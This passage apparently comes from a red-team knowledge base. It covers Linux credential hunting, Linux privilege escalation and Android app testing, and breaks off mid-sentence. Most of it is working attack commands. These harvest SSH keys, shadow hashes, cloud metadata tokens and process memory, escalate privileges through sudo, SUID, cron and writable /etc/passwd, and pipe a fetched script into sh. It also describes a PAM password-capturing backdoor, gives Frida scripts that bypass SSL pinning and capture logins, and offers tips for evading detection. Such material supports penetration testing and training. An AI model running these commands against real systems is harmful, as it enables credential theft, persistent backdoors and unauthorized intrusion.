Credential hunting is the digital equivalent — once you're on the machine, you have \"cleaning crew\" access and can look in unlocked drawers (config files), read sticky notes (history files), and check under keyboards (environment variables).\n\n## ◈ INTERMEDIATE\n\nSystematically extracting credentials from Linux systems for privilege escalation and lateral movement.\n\n## SSH Keys\n\n```bash\n# Find SSH private keys\nfind / -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"id_ecdsa\" -o -name \"id_dsa\" 2>/dev/null\nfind / -name \"*.pem\" -o -name \"*.key\" 2>/dev/null\nls -la /home/*/.ssh/ /root/.ssh/ 2>/dev/null\n\n# Check authorized_keys for lateral movement targets\ncat /home/*/.ssh/authorized_keys 2>/dev/null\n# Keys here indicate which other systems this user can access\n\n# SSH agent forwarding — if agent is active, use it for lateral movement\nenv | grep SSH_AUTH_SOCK\nssh-add -l # list cached keys in agent\n```\n\nIf you find a private key, check its passphrase protection. Crack with John:\n```bash\nssh2john id_rsa > id_rsa.hash\njohn --wordlist=rockyou.txt id_rsa.hash\n```\n\n## History Files\n\n```bash\n# Shell history\ncat ~/.bash_history ~/.zsh_history /home/*/.bash_history 2>/dev/null\n\n# Application-specific history\ncat ~/.mysql_history ~/.psql_history ~/.python_history ~/.node_repl_history 2>/dev/null\ncat ~/.redis-cli-history 2>/dev/null\n\n# Look for passwords passed as arguments\ngrep -iE 'pass|pwd|secret|token|key|mysql.*-p|ssh.*@|curl.*-u' ~/.bash_history 2>/dev/null\n```\n\nHistory files frequently contain database passwords (`mysql -u root -p'password'`), SSH commands with key paths, curl commands with API tokens, and other sensitive data.\n\n## Configuration Files\n\n```bash\n# Web application configs\nfind / -name \"wp-config.php\" -o -name \".env\" -o -name \"database.yml\" -o -name \"settings.py\" \\\n -o -name \"config.php\" -o -name \"db.php\" -o -name \"application.properties\" 2>/dev/null\n\n# Common credential locations\ncat /var/www/*/wp-config.php 2>/dev/null # WordPress DB creds\ncat /var/www/*/.env 2>/dev/null # Laravel/Node.js secrets\ncat /opt/*/config/database.yml 2>/dev/null # Rails DB config\ncat /etc/shadow 2>/dev/null # System password hashes\n\n# Version control credentials\ncat ~/.git-credentials 2>/dev/null\ncat ~/.gitconfig 2>/dev/null\nfind / -name \".git\" -type d 2>/dev/null # Git repos may contain secrets in history\n\n# Network credentials\ncat ~/.netrc 2>/dev/null # FTP/HTTP credentials\ncat ~/.pgpass 2>/dev/null # PostgreSQL passwords\ncat /etc/my.cnf ~/.my.cnf 2>/dev/null # MySQL credentials\ncat /etc/redis/redis.conf 2>/dev/null | grep requirepass\n```\n\n## Process Memory and Environment\n\n```bash\n# Read environment variables of running processes (requires same user or root)\ncat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|token|key|api'\n\n# List processes with command-line arguments\nps auxww | grep -iE 'pass|pwd|secret|token'\n\n# Process memory dumping (requires ptrace capability or same UID)\ncat /proc/1234/maps\ngdb -p 1234 -batch -ex 'dump memory /tmp/heap.bin 0xADDR1 0xADDR2'\nstrings /tmp/heap.bin | grep -iE 'password|token|secret'\n```\n\n## Kernel Keyring\n\n```bash\n# List keys in the kernel keyring\nkeyctl show\nkeyctl read KEY_ID\nkeyctl print KEY_ID\n\n# Session keyring may contain credentials used by applications\ncat /proc/keys 2>/dev/null\n```\n\n## Cloud Credentials\n\n```bash\n# AWS\ncat ~/.aws/credentials ~/.aws/config 2>/dev/null\nenv | grep AWS\n\n# Azure\ncat ~/.azure/accessTokens.json ~/.azure/azureProfile.json 2>/dev/null\n\n# GCP\ncat ~/.config/gcloud/credentials.db ~/.config/gcloud/application_default_credentials.json 2>/dev/null\n\n# Instance metadata (from cloud VMs)\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null\ncurl -s -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\" 2>/dev/null\n\n# Kubernetes service account tokens\ncat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null\n```\n\n## /etc/shadow Cracking\n\n```bash\n# If readable (misconfiguration or root access)\nunshadow /etc/passwd /etc/shadow > combined.txt\njohn --wordlist=rockyou.txt combined.txt\nhashcat -m 1800 shadow_hashes.txt rockyou.txt # sha512crypt (mode 1800)\nhashcat -m 500 shadow_hashes.txt rockyou.txt # md5crypt (mode 500)\n```\n\n## Kerberos Keytab Files\n\n```bash\n# Keytab files contain Kerberos long-term keys (equivalent to password hashes)\nfind / -name \"*.keytab\" 2>/dev/null\nfind / -name \"krb5.keytab\" 2>/dev/null\nls -la /etc/krb5.keytab # system keytab (machine account)\n\n# Use keytab to authenticate (if readable)\nkinit -k -t /path/to/service.keytab service@CORP.LOCAL\nklist # verify ticket obtained\n\n# Extract hash from keytab for offline cracking\npython3 keytabextract.py /path/to/service.keytab\n# Outputs: RC4-HMAC (NTLM) or AES keys — hashcat or pass-the-key\n\n# With Impacket:\nimpacket-getTGT corp.local/service -k -no-pass -keytab service.keytab\n```\n\n## Docker and Container Secrets\n\n```bash\n# Docker environment variables often contain database passwords, API keys\ndocker inspect --format='{{.Config.Env}}' $(docker ps -q) 2>/dev/null\n\n# Kubernetes secrets\nkubectl get secrets -A 2>/dev/null\nkubectl get secret secretname -o jsonpath='{.data}' 2>/dev/null | base64 -d\n```\n\n## Automated Credential Scanning\n\n```bash\n# Search for common credential patterns across filesystem\ngrep -rIl \"password\" /etc/ /opt/ /var/ /home/ 2>/dev/null | head -50\ngrep -rI \"AKIA[A-Z0-9]\" /home/ /opt/ /var/ 2>/dev/null # AWS access key pattern\nfind / -name \"*.kdbx\" -o -name \"*.keypass\" -o -name \"vault.json\" 2>/dev/null\n```\n\n## OpSec Notes\n\n- Reading /proc/PID/environ for other users' processes requires root or ptrace capability\n- Accessing .bash_history for other users requires root or file permission misconfiguration\n- Cloud metadata queries are logged in cloud audit trails\n- gdb attachment triggers ptrace syscall which may be monitored\n- Prefer targeted searches over broad filesystem scans to reduce noise\n- Process memory dumping generates significant disk I/O — use tmpfs when possible\n\n## ◈ ADVANCED\n\n### PAM Module Backdoor for Credential Capture\n\nIf root access is obtained, a PAM module backdoor captures plaintext passwords for all subsequent authentications:\n\n```\n1. Write a custom PAM module (shared library) that logs pam_get_authtok() results\n2. Install it in /lib/security/ or /lib64/security/\n3. Add it to /etc/pam.d/common-auth before pam_unix.so\n4. All user authentications (login, sudo, ssh) now log plaintext passwords\n\nDetection: PAM module hashes change; tripwire/AIDE catches it\nEvasion: match original module's mtime and size; disable AIDE before installing\n```\n\n### Memory-Only Credential Extraction via /proc\n\nFor containers where writing to disk is monitored, extract credentials from process memory via procfs:\n\n```bash\n# Dump heap of a target process without gdb (uses only built-in shell tools)\n# Find heap region from /proc/PID/maps\nhead -1 /proc/$(pgrep mysql)/maps\n# Read via /proc/PID/mem using dd\ndd if=/proc/$(pgrep mysql)/mem bs=1 skip=$((16#)) count=$((16# - 16#)) 2>/dev/null | strings | grep -i pass\n```\n\n### SNMP Community String Hunting\n\nSNMP community strings grant read/write access to network device configurations:\n\n```bash\ngrep -r \"community\" /etc/ 2>/dev/null | grep -v \"^Binary\"\ncat /etc/snmp/snmpd.conf 2>/dev/null | grep -v \"^#\"\n\n# If community string found — query for sensitive data\nsnmpwalk -v2c -c COMMUNITY 192.168.1.1 .1.3.6.1.4.1 # enterprise MIBs\n```\n\n### Git Repository Secret Mining\n\nGit history can contain secrets even if they were later deleted from the codebase:\n\n```bash\n# Find all git repos\nfind / -name \".git\" -type d 2>/dev/null\n\n# Search all commits for secrets\ncd /path/to/repo\ngit log --all --full-history -- \"**/*.env\" -- \"**/*.key\"\ngit log -p | grep -iE 'password|secret|token|key|api'\n\n# truffleHog for automated git secret scanning\ntrufflehog git file:///path/to/repo --only-verified\n\n# Search all branches\nfor branch in $(git branch -r | grep -v \"\\->\"); do\n git checkout $branch 2>/dev/null\n grep -rI \"password\\|secret\\|api_key\" . 2>/dev/null\ndone\n```\n\n### Vault / Secret Manager Credential Access\n\nHashiCorp Vault and cloud-native secret managers leave tokens behind:\n\n```bash\n# Vault token file\ncat ~/.vault-token 2>/dev/null\nenv | grep VAULT\n\n# If Vault token found, enumerate secrets\nexport VAULT_TOKEN=s.XXXXX\nvault list secret/\nvault kv list secret/\nvault kv get secret/database/password\n\n# AWS Secrets Manager via IMDS credentials\naws secretsmanager list-secrets --region us-east-1\naws secretsmanager get-secret-value --secret-id /prod/database/password\n```\n\n### LDAP Anonymous Bind Credential Enumeration\n\nLinux systems joined to AD often have LDAP configuration with bind credentials:\n\n```bash\n# Check for LDAP bind credentials in common locations\ncat /etc/ldap.conf /etc/ldap/ldap.conf /etc/nslcd.conf 2>/dev/null | grep -iE 'bind|pass'\ncat /etc/sssd/sssd.conf 2>/dev/null\ncat /etc/pam_ldap.conf 2>/dev/null\n\n# Test anonymous bind (if configured)\nldapsearch -x -H ldap://ldap.target.com -b \"dc=target,dc=com\"\n\n# With found credentials\nldapsearch -x -H ldap://ldap.target.com -D \"cn=svcldap,dc=target,dc=com\" \\\n -w 'found_password' -b \"dc=target,dc=com\" \"(objectClass=user)\" userPassword\n```\n\n### Container Escape via Mounted Secrets\n\nKubernetes secrets are often mounted as files inside containers:\n\n```bash\n# Standard K8s service account token mount\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\ncat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n\n# Check what the token can access\nkubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --list\n\n# Common over-permissioned service accounts can read secrets from other namespaces\nkubectl --token=... get secrets -A\nkubectl --token=... exec -it target-pod -- env # get env vars of another pod\n```", "last_updated": "2026-03-18"}, "linux-local-privesc": {"slug": "linux-local-privesc", "title": "Linux Local Privilege Escalation", "category": "Linux Privesc", "content": "# Linux Local Privilege Escalation\n\n## ◈ BEGINNER\n\n### What is Linux Privilege Escalation?\n\nAfter gaining initial access to a Linux machine — often as a low-privilege user like `www-data`, `nobody`, or a regular user account — privilege escalation means elevating to `root` (uid=0), which has unrestricted control over the entire system.\n\n**Why does root matter?**\n- Root can read any file, including SSH keys, shadow hashes, and application credentials\n- Root can install persistent backdoors that survive reboots\n- Root can pivot to other machines using credentials found on this one\n- Many container escape techniques require root inside the container\n\n**Key terms:**\n- **root** — the superuser on Linux; uid=0; unlimited privileges\n- **sudo** — a command that lets specific users run commands as root; misconfigured sudo rules are a primary escalation path\n- **SUID/SGID** — special file permission bits; when set on an executable, it runs as the file owner (often root) regardless of who launches it\n- **capabilities** — fine-grained privilege system that lets binaries have specific root-like powers without full root access\n- **cron** — Linux task scheduler; jobs running as root with writable scripts are an escalation goldmine\n- **PATH hijacking** — placing a malicious binary earlier in the PATH than the legitimate one; if a root-owned script calls commands without full paths, your version runs instead\n- **/etc/passwd** — user database; world-writable (misconfiguration) means you can add a root-equivalent user\n- **NFS** — Network File System; `no_root_squash` option allows remote root to act as local root\n\n**The basic mindset:** Linux systems accumulate configuration debt. Administrators add sudo rules for convenience, install software with SUID bits, configure cron jobs, and mount NFS shares — and they make mistakes. Enumeration finds those mistakes.\n\n**Analogy:** You're a delivery person with building access (low privilege). Privilege escalation is finding the master key someone left in a supply closet, a propped-open server room door, or a notebook with \"root password: [Company]2024!\" written inside.\n\n## ◈ INTERMEDIATE\n\nEnumeration and exploitation techniques for escalating to root on Linux systems.\n\n## Automated Enumeration\n\n**LinPEAS** — comprehensive Linux enumeration:\n```bash\n# Download and run\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Or transfer and run\nchmod +x linpeas.sh && ./linpeas.sh | tee /tmp/linpeas_out.txt\n```\n\n**LinEnum**:\n```bash\nchmod +x LinEnum.sh && ./LinEnum.sh -t\n```\n\n**linux-exploit-suggester**:\n```bash\n./linux-exploit-suggester.sh\n./linux-exploit-suggester-2.pl\n```\n\n**pspy** — monitor processes without root (finds cron jobs, process arguments):\n```bash\n./pspy64 -p -i 1000\n```\n\n## Sudo Misconfigurations\n\n```bash\n# Check sudo permissions\nsudo -l\n\n# Common exploitable sudo rules:\nsudo /usr/bin/vim # :!/bin/bash\nsudo /usr/bin/find # find / -exec /bin/bash \\;\nsudo /usr/bin/less # !/bin/bash\nsudo /usr/bin/python3 -c \"import os; os.execl('/bin/sh', 'sh', '-p')\"\nsudo /usr/bin/awk # awk 'BEGIN {system(\"/bin/bash\")}'\nsudo /usr/bin/nmap # nmap --interactive → !sh\n\n# GTFOBins — comprehensive list of binary sudo escapes\n# https://gtfobins.github.io/\n```\n\n**NOPASSWD entries**: If sudo rules have `NOPASSWD`, no password required:\n```bash\nsudo -u root /bin/bash # if (ALL) NOPASSWD: ALL\n```\n\n## SUID/SGID Binaries\n\n```bash\n# Find all SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Find SGID binaries\nfind / -perm -2000 -type f 2>/dev/null\n\n# Notable SUID escalation paths (check GTFOBins):\n# /usr/bin/find: find . -exec /bin/sh -p \\;\n# /usr/bin/vim: vim -c ':py import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'\n# /usr/bin/cp: overwrite /etc/shadow\n# /usr/bin/nmap: --interactive mode (older versions)\n# /usr/bin/python: python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'\n```\n\n## Linux Capabilities\n\nCapabilities grant specific root powers without full root access:\n\n```bash\n# Find binaries with capabilities\ngetcap -r / 2>/dev/null\n\n# Dangerous capabilities:\n# cap_setuid — can set UID to 0 → root\n# cap_net_raw — raw network access\n# cap_sys_admin — broad admin powers\n\n# Example: python3 with cap_setuid\n/usr/bin/python3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"\n```\n\n## Cron Job Abuse\n\n```bash\n# Check cron jobs\ncat /etc/crontab\nls -la /etc/cron.*\ncrontab -l\n\n# Monitor with pspy to find unlisted jobs\n./pspy64\n\n# If cron job runs a script you can modify:\necho 'chmod u+s /bin/bash' >> /path/to/script.sh\n# Wait for cron to run, then:\n/bin/bash -p # -p preserves SUID root privilege\n```\n\n## Writable /etc/passwd\n\nIf `/etc/passwd` is world-writable, add a root user:\n```bash\n# Check permissions\nls -la /etc/passwd\n\n# Generate password hash\nopenssl passwd -1 -salt xyz password123\n# Output: $1$xyz$abc123...\n\n# Add root user (uid=0, gid=0)\necho 'hacker:$1$xyz$abc123...:0:0:hacker:/root:/bin/bash' >> /etc/passwd\n\n# Login as hacker\nsu hacker\n```\n\n## NFS no_root_squash\n\n```bash\n# Check NFS exports on remote machine\ncat /etc/exports\nshowmount -e target_ip\n\n# If no_root_squash is present for a share:\n# Mount the share as root on attacker machine\nmount -o rw target_ip:/share /mnt/nfs\n\n# Create SUID root binary on the share\ncp /bin/bash /mnt/nfs/rootbash\nchmod +s /mnt/nfs/rootbash\n\n# On target:\n/share/rootbash -p # runs as root\n```\n\n## Container Escape\n\nIf running inside Docker/LXC:\n\n```bash\n# Check if in container\ncat /.dockerenv\nls /.dockerenv 2>/dev/null && echo \"In Docker\"\n\n# Check capabilities\ncapsh --print\n\n# Privileged container escape\n# If --privileged flag set: full host access\nmount /dev/sda1 /mnt\nchroot /mnt\n```\n\n## Kernel Exploits\n\n```bash\n# Get kernel version\nuname -r\nuname -a\n\n# Check against exploit-suggester\n./linux-exploit-suggester.sh\n\n# Common kernel exploits:\n# Dirty COW (CVE-2016-5195) — Linux kernel < 4.8.3\n# PwnKit (CVE-2021-4034) — pkexec SUID, present in all major distros\n# Dirty Pipe (CVE-2022-0847) — Linux 5.8 to 5.16.11\n```\n\n**PwnKit** (most broadly applicable):\n```bash\n# Works on virtually every Linux distro with pkexec installed\n# Compiled exploit available on GitHub\ngcc -o pwnkit pwnkit.c\n./pwnkit\n```\n\n## PATH Hijacking\n\n```bash\n# If root-owned script calls commands without full path:\ncat /root/backup.sh\n# #!/bin/bash\n# tar -czf /backup/home.tgz /home\n\n# Check PATH manipulation opportunities\necho $PATH\n# If you can write to a directory early in PATH:\necho '/bin/bash' > /tmp/tar\nchmod +x /tmp/tar\nexport PATH=/tmp:$PATH\n# Next time the script runs, your 'tar' executes as root\n```\n\n## Shared Library Injection\n\n```bash\n# Check if a SUID binary uses a writable library\nldd /usr/bin/suid_binary\n# If library path is writable, drop malicious .so\n\n# LD_PRELOAD abuse (if sudo allows)\n# Write malicious.c:\n# void _init() { setuid(0); system(\"/bin/bash\"); }\n# gcc -fPIC -shared -nostartfiles -o /tmp/mal.so malicious.c\nsudo LD_PRELOAD=/tmp/mal.so allowed_binary\n```\n\n## OpSec Notes\n\n- LinPEAS generates significant disk I/O and network activity — use carefully on sensitive targets\n- pspy passively monitors and is nearly undetectable\n- Kernel exploits can crash the system — test in a lab first\n- SUID binary abuse generates no special logging; hard to detect\n- sudo commands are logged to auth.log by default\n\n## ◈ ADVANCED\n\n### Systemd Timer and Unit File Abuse\n\nSystemd timers are the modern replacement for cron jobs and often overlooked:\n\n```bash\n# Find all timers\nsystemctl list-timers --all\n\n# Find writable unit files\nfind /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null\n\n# If a unit file path or ExecStart binary is writable:\n# Modify the ExecStart to execute your payload\n# Then: systemctl daemon-reload && systemctl start vulnerable.timer\n```\n\nAlso check for writable paths in unit files that run as root:\n```bash\ngrep -r \"ExecStart=\" /etc/systemd/system/ 2>/dev/null | grep -v \"#\"\n```\n\n### D-Bus Service Exploitation\n\nD-Bus is Linux's IPC mechanism. Privileged D-Bus services with misconfigured policies allow unprivileged users to call root-level methods:\n\n```bash\n# Enumerate D-Bus services\nbusctl list\ndbus-send --system --print-reply --dest=org.freedesktop.DBus / org.freedesktop.DBus.ListNames\n\n# Check polkit policies for \"no\" (always allow)\nfind /usr/share/polkit-1/actions/ -name \"*.policy\" | xargs grep -l \"yes\\|auth_admin\"\n```\n\n**CVE-2021-3560** (polkit bypass): Send a D-Bus request and kill it mid-flight — race condition in polkit allows escalation without authentication on older versions.\n\n### Abusing Writable Docker Socket\n\nIf the `docker.sock` Unix socket is writable by your user:\n\n```bash\n# Check for docker socket\nls -la /var/run/docker.sock\nid | grep docker\n\n# Escape via container mounting host filesystem\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n# Or via privileged container\ndocker run --privileged --rm -it alpine /bin/sh\n# Then mount host block device and modify files\n```\n\n### Shared Memory Race Conditions\n\nTOCTOU (time-of-check to time-of-use) in privileged scripts:\n\n```bash\n# If root script does: test -f /tmp/file && process /tmp/file\n# Race: replace /tmp/file with a symlink between the check and use\n\n# inotifywait to trigger at the right moment\ninotifywait -e access /tmp/file && ln -sf /etc/shadow /tmp/file\n```\n\n### LD_LIBRARY_PATH and Rpath Manipulation\n\n```bash\n# Check RPATH in SUID binaries\nreadelf -d /usr/bin/suid_binary | grep RPATH\nobjdump -x /usr/bin/suid_binary | grep RPATH\n\n# If RPATH includes a writable directory:\n# Drop a malicious .so with the name of a library it loads\ngcc -fPIC -shared -o /writable/path/libvuln.so.1 malicious.c\n```\n\n### Kernel Module Loading Without CAP_SYS_MODULE\n\nWith `CAP_NET_ADMIN` or via `userfaultfd` + kernel UAF exploitation, kernel module loading can be achieved without the explicit `CAP_SYS_MODULE` capability. In 2026, userfaultfd-based kernel exploits remain viable on kernels without `unprivileged_userfaultfd=0`.\n\n### Abuse of Systemd-Resolved / nsswitch\n\nIf a privileged process resolves hostnames without full path in a `/etc/hosts`-influenced context, DNS-based TOCTOU is possible. More commonly: NSS (Name Service Switch) plugins in `/etc/nsswitch.conf` pointing to writable directories — drop a malicious NSS plugin to execute code when root reads `/etc/passwd`.\n\n### CVE-2022-0847 Dirty Pipe (Linux 5.8–5.16)\n\nOverwrite arbitrary read-only files (including SUID binaries and /etc/passwd) via pipe splicing:\n\n```\n1. Open target file (e.g., /usr/bin/su) for reading\n2. Create a pipe with a dirty page (splice + write)\n3. Splice target file content into pipe\n4. Write payload into pipe — overwrites cached file pages\n5. Target file content is now modified in page cache\n6. Execute the modified binary to get root\n```\n\nThis technique patches files in-memory without touching disk — leaves no traditional file modification artifacts.", "last_updated": "2026-03-18"}, "android-security": {"slug": "android-security", "title": "Android Security Testing", "category": "Mobile", "content": "# Android Security Testing\n\n## ◈ BEGINNER\n\n### What Is Android Security Testing?\n\n**Android security testing** assesses the security of Android applications and the Android platform itself. It covers static analysis (reading the code and configuration), dynamic analysis (observing the app while it runs), and attack surface enumeration (finding ways an attacker could abuse the app).\n\n**Why Android is a major red team target:** Android devices contain a vast amount of sensitive data — corporate email, authentication tokens, credentials stored in apps, location history, and encrypted communications. Compromising an Android app or device can provide persistent access to corporate resources, particularly as employees use personal phones for work via MDM.\n\n**Key terms:**\n- **APK** — Android Package; the installable file format for Android apps; essentially a ZIP file containing compiled code, resources, and a manifest\n- **ADB (Android Debug Bridge)** — the command-line tool for interacting with Android devices via USB or network; enables shell access, file transfer, log viewing, and app installation\n- **AndroidManifest.xml** — the central config file for an Android app; declares permissions, exported components, and debuggable state; primary target for static analysis\n- **Exported component** — an Activity, Service, or ContentProvider marked `exported=true`; accessible from other apps or via ADB without permission; common vulnerability\n- **Frida** — a dynamic instrumentation framework; injects JavaScript into running processes at runtime; used to hook functions, bypass SSL pinning, and circumvent root detection\n- **objection** — a Frida-powered mobile exploration toolkit; automates common tasks like SSL pinning bypass, root detection bypass, and keychain/preference dumping\n- **SSL pinning** — an app security control where the app validates the server's specific certificate (not just any trusted CA); blocks standard proxy interception\n- **Root detection** — apps that refuse to run on rooted devices; bypassed with Frida hooks that make root check functions return false\n- **MobSF (Mobile Security Framework)** — an automated static analysis tool for APKs; identifies hardcoded secrets, insecure configurations, and dangerous permission usage\n- **Drozer** — a framework for attacking Android apps from another app's perspective; tests exported components, content providers, and intent handling\n- **jadx** — a decompiler that converts compiled Android DEX bytecode back to readable Java source code; essential for code review\n\n**The testing workflow:**\n```\n1. Obtain APK (from device via ADB or APK Mirror)\n2. Static analysis: jadx/apktool + grep for secrets, check manifest\n3. Dynamic analysis: Burp proxy + Frida SSL bypass → observe API traffic\n4. Component testing: drozer → attack exported activities/providers\n5. Data storage: check SharedPrefs, SQLite, logcat for sensitive data leakage\n```\n\n**Analogy:** Android security testing is like being a building inspector for an app. You check the blueprints (manifest), look for unlocked doors (exported components), test whether windows block X-rays (SSL pinning), and check if the safe's combination is written on a sticky note (hardcoded secrets in code).\n\n## ◈ INTERMEDIATE\n\nAndroid's open architecture, sideloading capability, and diverse OEM ecosystem make it a rich target for red team operations. From APK analysis to runtime manipulation, Android testing covers a wide attack surface.\n\n### Android Security Model\n\n```\nSecurity layers (outer to inner):\n1. SELinux (Mandatory Access Control) — enforces process boundaries\n2. Application Sandbox — each app UID-isolated\n3. Permission Model — explicit grants for sensitive resources\n4. Verified Boot / dm-verity — boot chain integrity\n5. Keystore / StrongBox — hardware-backed key storage\n6. Play Protect — app scanning (bypassable)\n```\n\n---\n\n### ADB (Android Debug Bridge)\n\n```bash\n# Enable: Developer Options → USB Debugging\nadb devices # list connected devices\nadb shell # interactive shell\nadb shell id # check privilege (uid=2000 shell or root)\n\n# File operations\nadb push /local/file /sdcard/\nadb pull /sdcard/file /local/\n\n# Install/uninstall\nadb install app.apk\nadb uninstall com.target.app\n\n# Capture screenshot/screen recording\nadb shell screencap /sdcard/screen.png && adb pull /sdcard/screen.png\nadb shell screenrecord /sdcard/demo.mp4\n\n# Logcat (application logs — often leak credentials/tokens)\nadb logcat -d | grep -i \"password\\|token\\|key\\|secret\\|auth\"\nadb logcat com.target.app:D *:S\n\n# Port forwarding (tunnel app traffic through USB)\nadb forward tcp:8080 tcp:8080\n\n# Backup (Android < 12, backup allowed apps)\nadb backup -apk -shared -all -f backup.ab\ndd if=backup.ab bs=1 skip=24 | python3 -c \"import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" | tar -xvf -\n\n# Clipboard dump\nadb shell service call clipboard 2 i32 1 i32 0 i32 0\n\n# Dumpsys (system service info)\nadb shell dumpsys activity top # currently focused activity\nadb shell dumpsys package com.target # package permissions, activities\nadb shell dumpsys battery\n```\n\n---\n\n### APK Analysis\n\n#### Static Analysis\n\n```bash\n# Extract APK\nadb shell pm path com.target.app\n# /data/app/com.target.app-1/base.apk\nadb pull /data/app/com.target.app-1/base.apk\n\n# Decompile with apktool (resources + smali)\napktool d base.apk -o decompiled/\n\n# Decompile to Java with jadx\njadx base.apk -d output/\njadx-gui base.apk # GUI browser\n\n# Search for sensitive data in decompiled code\ngrep -ri \"api_key\\|secret\\|password\\|token\\|AWS\\|Bearer\" output/\ngrep -ri \"http://\" output/ # cleartext endpoints\ngrep -ri \"Log\\.\" output/ # debug logging\n\n# Extract strings\nstrings base.apk | grep -i \"key\\|secret\\|token\\|http\"\n\n# Check certificate\nkeytool -printcert -jarfile base.apk\njarsigner -verify base.apk\n\n# AndroidManifest.xml analysis\ncat decompiled/AndroidManifest.xml | grep -E \"exported|permission|debuggable\"\n# exported=true + no permission = public component (attack surface)\n# android:debuggable=true = can attach debugger\n```\n\n#### MobSF (Mobile Security Framework)\n\n```bash\n# Install and run\ndocker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n\n# Upload APK via web UI (http://localhost:8000)\n# Generates: security score, permissions analysis, network calls,\n# hardcoded secrets, exported components, binary analysis\n```\n\n---\n\n### Dynamic Analysis with Frida\n\nFrida is a dynamic instrumentation framework for runtime hooking:\n\n```bash\n# Setup\npip install frida-tools\n# Download frida-server for Android: github.com/frida/frida/releases\nadb push frida-server /data/local/tmp/\nadb shell \"chmod 755 /data/local/tmp/frida-server\"\nadb shell \"su -c /data/local/tmp/frida-server &\" # requires root\n\n# List running processes\nfrida-ps -U # -U = USB device\n\n# Attach to process\nfrida -U -n \"com.target.app\" -l script.js\n# or: frida -U -f com.target.app --no-pause -l script.js # spawn + inject\n```\n\n#### Frida Scripts\n\n```javascript\n// Bypass SSL Pinning (common patterns)\nJava.perform(function() {\n // TrustManager bypass\n var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');\n TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n return untrustedChain;\n };\n\n // OkHttp3 CertificatePinner bypass\n try {\n var CertificatePinner = Java.use('okhttp3.CertificatePinner');\n CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {\n console.log('[*] OkHttp3 SSL Pin bypassed');\n };\n } catch(e) {}\n\n // Retrofit / generic X509TrustManager\n var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');\n var SSLContext = Java.use('javax.net.ssl.SSLContext');\n var TrustManager = Java.registerClass({\n name: 'com.frida.TrustManager',\n implements: [X509TrustManager],\n methods: {\n checkClientTrusted: function(chain, authType) {},\n checkServerTrusted: function(chain, authType) {},\n getAcceptedIssuers: function() { return []; }\n }\n });\n var TrustManagers = [TrustManager.$new()];\n var SSLContextInit = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');\n SSLContextInit.implementation = function(keyManager, trustManager, secureRandom) {\n SSLContextInit.call(this, keyManager, TrustManagers, secureRandom);\n };\n console.log('[*] SSL Pinning Bypassed');\n});\n```\n\n```javascript\n// Bypass root detection\nJava.perform(function() {\n var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');\n RootBeer.isRooted.implementation = function() {\n console.log('[*] RootBeer.isRooted() bypassed');\n return false;\n };\n\n // Generic file existence check for su\n var File = Java.use('java.io.File');\n File.exists.implementation = function() {\n var path = this.getAbsolutePath();\n if (path.indexOf('su') !== -1 || path.indexOf('magisk') !== -1) {\n return false;\n }\n return this.exists.call(this);\n };\n});\n```\n\n```javascript\n// Hook login function — capture credentials\nJava.perform(function() {\n var LoginActivity = Java.use('com.target.app.LoginActivity');\n LoginActivity.login.overload('java.lang.String', 'java.lang.String').implementation = function(user, pass) {\n console.log('[*] Login: ' + user + ':' + pass);\n return this.login.call(this, user, pass);\n };\n});\n```\n\n#### objection (Frida automation)\n\n```bash\npip install objection\nobjection -g com.target.app explore\n\n# In objection REPL:\nandroid sslpinning disable\nandroid root disable\nandroid hooking list classes\nandroid hooking watch class com.target.app.LoginActivity\nandroid hooking watch class_method com.target.app.LoginActivity.login --dump-args --dump-return\nandroid keystore list\nandroid heap search instances com.target.app.Session\nandroid intent launch_activity com.target.app.DebugActivity\n```\n\n---\n\n### Drozer (Attack Surface Enumeration)\n\n```bash\n# Install drozer agent on device\nadb install drozer-agent.apk\nadb forward tcp:31415 tcp:31415\nadb shell am start -n com.mwr.dz/.activities.MainActivity\n\n# Connect\ndrozer console connect\n\n# Modules\nrun app.package.list -f target # find package\nrun app.package.info -a com.target.app # permissions, activities\nrun app.activity.info -a com.target.app # exported activities\nrun app.provider.info -a com.target.app # content providers\nrun app.service.info -a com.target.app # services\n\n# Attack exported activity (no permission required)\nrun app.activity.start --component com.target.app com.target.app.DebugActivity\n\n# Content provider attacks\nrun app.provider.query content://com.target.app.provider/users\nrun scanner.provider.injection -a com.target.app # SQL injection\nrun scanner.provider.traversal -a com.target.app # path traversal\n\n# Broadcast receiver attacks\nrun app.broadcast.send --component com.target.app com.target.app.MyReceiver \\\n --extra string action reset_password\n```\n\n---\n\n### Data Storage Analysis\n\n```bash\n# After rooting device or on emulator:\nadb shell \"su -c ls /data/data/com.target.app/\"\n# databases/ files/ shared_prefs/ cache/\n\n# SQLite databases\nadb shell \"su -c sqlite3 /data/data/com.target.app/databases/app.db .dump\"\n\n# Shared preferences (often stores tokens/prefs)\nadb shell \"su -c cat /data/data/com.target.app/shared_prefs/*.xml\"\n\n# Keystore entries\nadb shell \"su -c ls /data/misc/keystore/\"\n# Hardware-backed keys: not extractable; 